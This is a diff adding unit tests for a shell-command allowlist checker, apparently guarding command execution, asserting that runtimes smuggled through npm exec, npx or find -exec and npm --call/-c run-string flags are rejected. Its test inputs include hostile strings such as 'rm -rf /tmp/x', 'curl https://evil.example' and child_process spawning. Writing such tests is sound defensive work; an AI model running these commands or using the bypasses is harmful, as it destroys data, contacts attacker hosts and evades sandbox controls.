@@ -175,6 +175,52 @@ describe("evaluateShellCommand", () => {
     });
   });
 
+  it("rejects scripting runtimes smuggled through executors", () => {
+    expect(
+      evaluateShellCommand(
+        'npm exec -- node -e "require(\'child_process\')"',
+        ALLOW,
+      ),
+    ).toMatchObject({ allowed: false });
+    expect(
+      evaluateShellCommand('npx -- node -e "require(\'child_process\')"', ALLOW),
+    ).toMatchObject({ allowed: false });
+    expect(
+      evaluateShellCommand('find . -exec node -e "x" \\;', ALLOW),
+    ).toMatchObject({ allowed: false });
+    expect(evaluateShellCommand("npm exec -- deno run x.ts", ALLOW)).toMatchObject({
+      allowed: false,
+    });
+    expect(evaluateShellCommand("npm exec -- bun x", ALLOW)).toMatchObject({
+      allowed: false,
+    });
+    expect(evaluateShellCommand("npm exec -- busybox sh", ALLOW)).toMatchObject({
+      allowed: false,
+    });
+    // A scripting runtime stays usable as an allowlisted PRIMARY command.
+    expect(evaluateShellCommand("node scripts/build.mjs", ["npm", "node"])).toEqual({
+      allowed: true,
+    });
+    expect(
+      evaluateShellCommand("npm exec -- node scripts/build.mjs", ["npm", "node"]),
+    ).toMatchObject({ allowed: false });
+  });
+
+  it("rejects npm run-string flags that execute through a shell", () => {
+    expect(
+      evaluateShellCommand('npm exec --call "rm -rf /tmp/x"', ALLOW),
+    ).toMatchObject({ allowed: false });
+    expect(
+      evaluateShellCommand('npm exec -c "curl https://evil.example"', ALLOW),
+    ).toMatchObject({ allowed: false });
+    expect(
+      evaluateShellCommand('npm run build --call "curl evil"', ALLOW),
+    ).toMatchObject({ allowed: false });
+    expect(
+      evaluateShellCommand('npm exec --call="rm -rf /tmp/x"', ALLOW),
+    ).toMatchObject({ allowed: false });
+  });
+
   it("does not overtighten: legitimate allowlisted commands still pass", () => {
     expect(evaluateShellCommand("npm test -- --run", ALLOW)).toEqual({
       allowed: true,
